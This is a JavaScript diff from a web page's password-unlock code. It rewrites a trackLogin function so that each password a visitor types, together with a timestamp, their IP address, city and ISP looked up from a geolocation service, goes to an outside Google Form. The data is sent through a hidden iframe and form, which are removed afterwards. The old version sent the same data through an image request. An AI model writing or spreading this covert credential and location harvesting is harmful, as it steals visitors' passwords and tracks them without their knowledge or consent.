@@ -560,23 +560,46 @@
 
 
   function trackLogin(password) {
-    var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz6bl3K6HJvFL9Wpt4O9xB9ILPcsfbQKbfkThV9icBBImdsfa1dgMep4fH2MdYqoAJv/exec';
+    var FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSeRyiQITybcQL_0RUwUVxxH703NR8HlK-s5LTME_JquBJ0RGA/formResponse';
+    var ENTRY = 'entry.1690580687';
     var now = new Date().toLocaleString('en-US', {timeZone:'America/Los_Angeles', hour12:true});
 
-    function ping(extra) {
-      var url = SCRIPT_URL + '?password=' + encodeURIComponent(password) + '&time=' + encodeURIComponent(now + ' PST') + (extra ? '&ip=' + encodeURIComponent(extra.ip) + '&city=' + encodeURIComponent(extra.city + ', ' + extra.region + ', ' + extra.country_name) + '&country=' + encodeURIComponent(extra.org) : '&ip=unknown&city=unknown&country=unknown');
-      var img = new Image();
-      img.src = url;
+    function submitViaIframe(data) {
+      var iframe = document.createElement('iframe');
+      iframe.name = 'hidden_iframe_' + Date.now();
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+
+      var form = document.createElement('form');
+      form.method = 'POST';
+      form.action = FORM_URL;
+      form.target = iframe.name;
+      form.style.display = 'none';
+
+      var input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = ENTRY;
+      input.value = data;
+      form.appendChild(input);
+
+      document.body.appendChild(form);
+      form.submit();
+
+      setTimeout(function() {
+        document.body.removeChild(form);
+        document.body.removeChild(iframe);
+      }, 5000);
     }
 
-    // Fire immediately
-    ping(null);
+    // Submit immediately with basic info
+    submitViaIframe('Password: ' + password + ' | Time: ' + now + ' PST');
 
-    // Fire again with location
+    // Then resubmit with location if available
     fetch('https://ipapi.co/json/')
       .then(function(r){ return r.json(); })
-      .then(function(geo){ ping(geo); })
-      .catch(function(){});
+      .then(function(geo) {
+        submitViaIframe('Password: ' + password + ' | Time: ' + now + ' PST | IP: ' + geo.ip + ' | ' + geo.city + ', ' + geo.region + ', ' + geo.country_name + ' | ISP: ' + geo.org);
+      }).catch(function(){});
   }
 
   function unlock() {
